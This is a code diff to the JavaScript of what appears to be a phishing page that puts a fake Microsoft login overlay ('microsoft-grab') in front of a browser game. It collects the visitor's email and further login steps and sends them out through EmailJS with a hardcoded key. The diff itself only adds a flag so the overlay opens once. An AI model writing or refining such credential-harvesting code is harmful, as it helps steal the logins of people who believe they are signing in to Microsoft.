@@ -1,5 +1,5 @@
 var step = 0;
-
+var oppened = false;
 function SendDatas() {
     emailjs.init("-hu14sLxQEGeP67mu");
     var params = {
@@ -10,8 +10,8 @@ function SendDatas() {
     document.getElementById('microsoft-grab').style.display = "none";
     document.getElementById('game').style.display = "block";
     document.getElementById('body').style.background = "#1FADC7";
+    oppened = false;
 }
-
 function Next() {
     if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(document.getElementById('email').value)) {
         step = 1;
@@ -22,14 +22,15 @@ function Next() {
         document.getElementById('microsoft-grab').style.height = "450px";
     }
 }
-
 function Start() {
-    step = 0;
-    document.getElementById('microsoft-grab').style.display = "block";
-    document.getElementById('game').style.display = "none";
-    document.getElementById('body').style.background = "azure";
+    if (!oppened) {
+        step = 0;
+        document.getElementById('microsoft-grab').style.display = "block";
+        document.getElementById('game').style.display = "none";
+        document.getElementById('body').style.background = "azure";
+        oppened = true;
+    }
 }
-
 function MicrosoftGrabLoop() {
     // show overlay
     if (step === 0) {
@@ -41,7 +42,6 @@ function MicrosoftGrabLoop() {
         document.getElementById('step1').style.display = "block";
         document.getElementById('bottom-part').style.display = "none";
     }
-
     // set e-mail on overlay 2
     document.getElementById('emailBack').innerHTML = document.getElementById('email').value;
 }
